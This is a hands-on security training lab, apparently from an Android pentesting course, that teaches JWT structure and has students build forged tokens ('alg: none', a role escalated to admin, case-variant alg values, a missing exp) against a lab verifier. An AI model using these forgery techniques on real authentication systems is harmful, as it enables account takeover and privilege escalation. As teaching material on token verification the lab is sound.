# Lab 01 — Anatomy of a Token

**Difficulty:** Beginner
**Time:** 60–90 minutes
**Prerequisites:** A terminal, Python 3.8+, and [Chapter 46 §2.5 and §3.1–§3.5](../README.md)

---

## Objective

Stop finding tokens mysterious.

By the end of this lab you will have **minted a JWT by hand**, read its payload back with
no key, broken it in four different ways, and — the part that matters most — worked out
which of those four breakages a verifier could actually detect. You will also have looked
at an opaque token and understood why none of it applies.

This is the foundation for everything else in the chapter. Lab 02 forges tokens against a
verifier; you cannot reason about a forgery you do not understand structurally.

> **Safety rule for this and every lab in chapter 46**
> Every token you handle is one you minted yourself. Do not paste a token from a real
> account into any tool here, or anywhere else. If a token appears in your terminal in this
> lab, you created it seconds earlier from a keypair that will be destroyed at the end.

---

## Setup

```bash
# host
mkdir -p ~/ch46-lab01 && cd ~/ch46-lab01
python3 --version        # 3.8 or newer
python3 -c "import cryptography; print(cryptography.__version__)" || pip install cryptography
```

Everything in Part 1 and Part 2 uses the standard library only. `cryptography` is needed
for Part 4.

Run every Python invocation with `python3 -B`. Without it, Python may leave a
`__pycache__` directory behind, which is on this repository's artefact blocklist.

---

## Part 1 — Build a JWT with your bare hands

### Step 1.1 — The two JSON objects

A JWT is not a cryptographic construct that happens to contain JSON. It is **two JSON
objects and a signature over their encoded forms**. Write them out.

```bash
# host
cat > header.json <<'EOF'
{"alg":"HS256","typ":"JWT","kid":"demo-1"}
EOF

cat > claims.json <<'EOF'
{"iss":"https://issuer.lab.local","sub":"alice","aud":"com.example.app","exp":2000000000,"role":"user"}
EOF

cat header.json claims.json
```

**Q1.** Look at `claims.json`. Which of those five keys are *registered* claims from RFC
7519 §4.1, and which one is application-specific? What is the practical difference?

### Step 1.2 — Encode them

```bash
# host — base64url each one. Note what we do to the output.
python3 -B - <<'PY'
import base64, json

def seg(path):
    obj = json.load(open(path))
    raw = json.dumps(obj, separators=(",", ":"), sort_keys=True).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

h, c = seg("header.json"), seg("claims.json")
print("header  :", h)
print("payload :", c)
open("signing_input.txt", "w").write(f"{h}.{c}")
print("signing input written to signing_input.txt")
PY

cat signing_input.txt
```

Three things happened there and each is deliberate:

- `urlsafe_b64encode` — the **base64url** alphabet. `+` becomes `-`, `/` becomes `_`.
- `.rstrip(b"=")` — RFC 7515 §2 says strip the padding.
- `separators=(",", ":")` — compact form, no spaces.

**Q2.** Remove `separators=(",", ":")` from that script and run it again. Does the encoded
payload change? Does the *meaning* change? Given that the signature will cover these exact
bytes, what does that tell you about re-serialising a token you intend to verify?

### Step 1.3 — Sign it

```bash
# host
python3 -B - <<'PY'
import base64, hashlib, hmac

secret = b"a-32-byte-secret-from-a-csprng!!"          # 32 bytes -- RFC 7518 section 3.2
si = open("signing_input.txt").read()
sig = hmac.new(secret, si.encode("ascii"), hashlib.sha256).digest()
token = si + "." + base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
open("token.jwt", "w").write(token)
print(token)
print()
print("signature is", len(sig), "bytes")
PY
```

You have minted a JWT. There was no library, no certificate, no key ceremony — one HMAC
call over a string.

**Q3.** The signature is 32 bytes. Why exactly 32? What would it be for `HS512`? What would
it be for `RS256` with a 2048-bit key? (§3.2.3 has the table; work it out first.)

### Step 1.4 — The moment that matters

```bash
# host — read the payload back. No key. No tool.
cut -d. -f2 token.jwt | tr '_-' '/+' | base64 -d 2>/dev/null; echo
```

**Q4.** You just read every claim without possessing the secret. Write down, in one
sentence each:
- what the signature **does** prove;
- what it **does not** prove.

If those two sentences are not crisp, re-read [§3.4](../README.md#34-the-claim-that-is-not-encrypted)
before continuing. Everything else in the chapter depends on this.

**Q5.** The `tr '_-' '/+'` in that command converts base64url back to standard base64
before `base64 -d`. Why is it needed? What would happen without it if the payload happened
to contain a `-` or `_`?

---

## Part 2 — Break it four ways

Now damage the token and see, for each damage, whether a verifier could detect it. Use the
broken verifier and the correct verifier that ship with the chapter, so you can compare.

```bash
# host — get the verifiers
CH46="path/to/Android-Pentesting-Notes/46-Tokens"      # adjust
mkdir -p keys && cp token.jwt keys/../
python3 -B - <<'PY'
open("keys/demo-1","wb").write(b"a-32-byte-secret-from-a-csprng!!")
PY
```

### Break 1 — Edit a claim, keep the signature

```bash
# host
python3 -B - <<'PY'
import base64, json
t = open("token.jwt").read()
h, p, s = t.split(".")
claims = json.loads(base64.urlsafe_b64decode(p + "=" * (-len(p) % 4)))
claims["role"] = "admin"
newp = base64.urlsafe_b64encode(
    json.dumps(claims, separators=(",",":"), sort_keys=True).encode()).rstrip(b"=").decode()
open("break1.jwt","w").write(f"{h}.{newp}.{s}")
print(f"{h}.{newp}.{s}")
PY

python3 -B "$CH46/examples/01-broken-verifier.py" --keydir keys --token-file break1.jwt
```

**Q6.** What happened? Which verifier property caught it? This is the *only*
break in this lab that the deliberately broken verifier detects.

### Break 2 — `alg: none`

```bash
# host
python3 -B - <<'PY'
import base64, json
t = open("token.jwt").read()
h, p, s = t.split(".")
claims = json.loads(base64.urlsafe_b64decode(p + "=" * (-len(p) % 4)))
claims["role"] = "admin"
def seg(o): return base64.urlsafe_b64encode(
    json.dumps(o, separators=(",",":"), sort_keys=True).encode()).rstrip(b"=").decode()
tok = seg({"alg":"none","typ":"JWT"}) + "." + seg(claims) + "."
open("break2.jwt","w").write(tok)
print(repr(tok[-20:]))       # look at the END of the string
PY

python3 -B "$CH46/examples/01-broken-verifier.py" --keydir keys --token-file break2.jwt
```

**Q7.** Look at the `repr` output. What is after the final dot? Now delete the trailing dot
from `break2.jwt` and run the verifier again. What error do you get, and why is that error
**misleading** for a tester who forgot the dot?

### Break 3 — Change `alg` to something the verifier does not know

```bash
# host
python3 -B - <<'PY'
import base64, json
def seg(o): return base64.urlsafe_b64encode(
    json.dumps(o, separators=(",",":"), sort_keys=True).encode()).rstrip(b"=").decode()
t = open("token.jwt").read()
p = t.split(".")[1]
claims = json.loads(base64.urlsafe_b64decode(p + "=" * (-len(p) % 4)))
for alg in ("NoNe", "HS128", "hs256", "None"):
    print(f"{alg:8} ->", end=" ")
    open(f"break3-{alg}.jwt","w").write(seg({"alg":alg,"typ":"JWT"}) + "." + seg(claims) + ".")
    print(f"break3-{alg}.jwt")
PY

for f in break3-*.jwt; do
  echo "=== $f"
  python3 -B "$CH46/examples/01-broken-verifier.py" --keydir keys --token-file "$f" | head -2
done
```

**Q8.** Which of the four algorithm strings were accepted? Look at the broken verifier's
source and find the single line that makes `NoNe` behave the same as `none`. Then answer:
is lowercasing the `alg` before comparison a *bug* or a *mitigation*? Explain your answer
in terms of what the verifier does with the result.

### Break 4 — Delete `exp`

```bash
# host
python3 -B - <<'PY'
import base64, hashlib, hmac, json
def seg(o): return base64.urlsafe_b64encode(
    json.dumps(o, separators=(",",":"), sort_keys=True).encode()).rstrip(b"=").decode()
t = open("token.jwt").read()
h, p, _ = t.split(".")
claims = json.loads(base64.urlsafe_b64decode(p + "=" * (-len(p) % 4)))
del claims["exp"]                                     # no expiry at all
secret = b"a-32-byte-secret-from-a-csprng!!"
si = h + "." + seg(claims)
sig = base64.urlsafe_b64encode(
    hmac.new(secret, si.encode(), hashlib.sha256).digest()).rstrip(b"=").decode()
open("break4.jwt","w").write(si + "." + sig)
print(si + "." + sig)
PY
```

this one is **correctly signed**. We had the secret, so we re-signed it properly.

**Q9.** A verifier that checks the signature will accept this token. What is wrong with it,
and what would a correct verifier have to do that is *not* a cryptographic operation?

Now compare against the correct verifier:

```bash
# host
for f in token.jwt break1.jwt break2.jwt break4.jwt; do
  printf '%-14s ' "$f"
  python3 -B "$CH46/examples/02-correct-verifier.py" \
      --token-file "$f" \
      --issuer https://issuer.lab.local \
      --audience com.example.app \
      --hmac-key demo-1=keys/demo-1 2>&1 | head -2 | tr '\n' ' '
  echo
done
```

**Q10.** Fill in this table from your own output, then explain each `REJECTED` reason in
your own words:

| Token | Broken verifier | Correct verifier | Reason the correct one gave |
|---|---|---|---|
| `token.jwt` (genuine) | | | |
| `break1.jwt` (edited payload) | | | |
| `break2.jwt` (`alg: none`) | | | |
| `break4.jwt` (no `exp`) | | | |

---

## Part 3 — Read a real-shaped token with the analyser

```bash
# host
python3 -B "$CH46/scripts/jwt-analyse.py" --token-file token.jwt \
    --expect-iss https://issuer.lab.local \
    --expect-aud com.example.app \
    --expect-alg RS256
```

**Q11.** You passed `--expect-alg RS256` but the token is HS256. What did the tool say, and
why is that specific mismatch worth a HIGH rather than an INFO?

**Q12.** The tool prints a `SENDER CONSTRAINING` section. What did it say, and what claim
would have to be present for it to say something different?

**Q13.** Run the transmission guard self-test:

```bash
python3 -B "$CH46/scripts/jwt-analyse.py" --self-test
```

Read `scripts/jwt-analyse.py`'s header comment and find the paragraph explaining why this
guard exists. Write one sentence on what could go wrong without it.

---

## Part 4 — The other kind of token

### Step 4.1 — Generate an opaque token

```bash
# host
python3 -B - <<'PY'
import secrets
print("opaque:", secrets.token_urlsafe(32))
PY
```

### Step 4.2 — Analyse it

```bash
# host
python3 -B "$CH46/scripts/jwt-analyse.py" --token "PASTE_THE_OPAQUE_TOKEN_HERE"
```

**Q14.** The tool refused to decode anything. List **three** attacks from
[§5](../README.md#5-security-perspective) that are now completely inapplicable, and explain
in one sentence *why* each one is inapplicable — not just that it is.

**Q15.** List **four** things you would test instead. (§3.3's flowchart has them, but write
yours before looking.)

### Step 4.3 — The trade, in your own words

**Q16.** Complete these two sentences without looking at §3.3:

> An opaque token buys ______________ and costs ______________.
> A JWT buys ______________ and costs ______________.

**Q17.** A team tells you they use JWTs because they "wanted a stateless architecture", and
then mentions that they maintain a Redis denylist of revoked `jti` values consulted on every
request. What would you say to them?

---

## Part 5 — Where it lives on Android (reading only)

No device is required for this part. Read
[`examples/03-BrokenTokenStore.java`](../examples/03-BrokenTokenStore.java) and
[`examples/04-HardenedTokenStore.kt`](../examples/04-HardenedTokenStore.kt) side by side.

**Q18.** `BrokenTokenStore.userIdFromIdToken` performs five steps. Four of them are
correct. Name the four, name the missing fifth, and explain why the presence of four
correct steps makes the method *more* dangerous at code-review time, not less.

**Q19.** `HardenedTokenStore` does not contain a fixed version of `userIdFromIdToken`. The
method is deleted. Read the comment explaining why. Do you agree? Construct the strongest
argument you can for the *opposite* position — that the client should verify — and then
say what defeats it.

**Q20.** Find the `Token` value class in `HardenedTokenStore.kt`. What problem does it
solve, and why is it a better answer than a code-review rule saying "do not log tokens"?

---

## Hints

<details>
<summary>Hint for Q2 — separators</summary>

Compare the two encoded payloads byte by byte. They differ, because `{"a": 1}` and
`{"a":1}` are different byte strings even though they parse to the same object.

Now think about a verifier that does this:

```python
claims = json.loads(b64url_decode(payload_b64))     # parse
recomputed = json.dumps(claims)                     # re-serialise
# ...and then signs or verifies over `recomputed`
```

It will compute a signature over different bytes than the issuer did.
</details>

<details>
<summary>Hint for Q7 — the trailing dot</summary>

`"a.b.".split(".")` gives `['a', 'b', '']` — three elements, the last one empty.
`"a.b".split(".")` gives `['a', 'b']` — two elements.

A verifier that checks `len(parts) != 3` rejects the second one with a *structural* error,
which looks exactly like "the attack failed". It did not fail; it was never sent.
</details>

<details>
<summary>Hint for Q8 — case handling</summary>

The line is `alg = str(header.get("alg", "")).lower()`.

Lowercasing is neither a bug nor a mitigation on its own — it is a *normalisation*. Whether
it helps or hurts depends entirely on what the next line does. Here the next line accepts.
In `examples/02-correct-verifier.py`, the comparison is against an allow-list of exact
strings with no normalisation at all, so `"NoNe"`, `"none"` and `"NONE"` are three
different strings and none of them is in the list.
</details>

<details>
<summary>Hint for Q9 — what is not cryptographic</summary>

Compare the current time against a number in the payload. That is it. No key, no hash, no
signature — one integer comparison, and it is the check that stops a token from being a
permanent credential.

The subtler half of the question: how does a verifier handle a token where `exp` is
*absent*? "Skip the check" is the answer that produces this vulnerability.
</details>

<details>
<summary>Hint for Q17 — statelessness</summary>

Ask how many requests per second hit that Redis instance, and what happens to the whole
estate when it is unavailable. Then ask what they are getting from the JWT that an opaque
token plus the same Redis lookup would not give them — the answer is usually "we already
built it".

This is not an argument that they are wrong. It is an argument that they should know which
property they are actually buying. §10's Principal-tier question covers the shape of it.
</details>

---

## Success criteria

- [ ] You minted a JWT with no library and can explain each of the three segments
- [ ] You read a payload back with no key, and can state in one sentence what the signature
      does and does not prove
- [ ] You produced all four breaks and recorded which verifier caught which
- [ ] You can explain why `break1` (edited payload) was caught by *both* verifiers and
      `break4` (no `exp`) was caught by only one
- [ ] You know why an `alg: none` token needs a trailing dot
- [ ] You ran the analyser and the transmission-guard self-test
- [ ] You can name three attacks that do not apply to an opaque token, and say why
- [ ] You completed the two "buys / costs" sentences in Q16 without looking
- [ ] You read the broken and hardened Android token stores and answered Q18–Q20 in writing

---

## Debrief

Answer these in writing. They are the point of the lab.

1. A colleague says "JWTs are secure because they're signed". Give the two-sentence
   correction: what signing achieves, and what it leaves entirely open.
2. You are handed a token in an engagement. Write down the first three commands you would
   run, in order, and say what decision each one informs.
3. Of the four breaks in Part 2, two were **forgeries** and two were not. Which were which,
   and what does that tell you about a test plan that only tries forgeries?
4. The broken verifier caught `break1` and nothing else. Explain, in one sentence a
   developer would accept, why "it verifies the signature" is a true statement about that
   verifier and also completely inadequate.
5. You find a JWT hardcoded in an app's `strings.xml`. It expired in 2023. Is this a
   finding? What is it actually worth to you?

---

## Next

[Lab 02 — The JWT attack gauntlet](lab-02-the-jwt-attack-gauntlet.md) takes the four breaks
from Part 2, adds four more, and runs all of them against a verifier you build — with a
correct verifier as the control.
